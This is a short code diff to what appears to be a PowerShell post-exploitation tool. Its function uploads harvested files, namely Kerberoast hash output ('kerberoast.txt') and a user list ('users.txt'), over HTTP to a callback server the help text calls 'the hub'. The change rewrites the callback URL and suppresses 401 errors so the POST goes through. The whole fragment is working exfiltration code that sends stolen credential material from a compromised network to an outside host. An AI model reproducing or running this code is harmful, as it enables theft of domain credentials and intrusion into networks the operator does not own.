@@ -304,7 +304,7 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
 #>
     Param(
        [Parameter(Mandatory=$True)]
-       [String[]]$Files,
+       [String[]]$Files
     )
 
     ForEach ($file in $Files) {
@@ -323,7 +323,12 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
             "--$boundary--$LF"
         ) -join $LF
 
-        $response = Invoke-RestMethod -Uri $CALLBACK_URL -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+        $url = $CALLBACK_URL.substring(0,$CALLBACK_URL.length-2)
+        try {
+            $response = Invoke-RestMethod -Uri $($url + "u") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+        } catch [System.Net.WebException] {
+             if (-not $_.Exception.Message -match "401")  {throw $_}
+        }
     }
 }
 
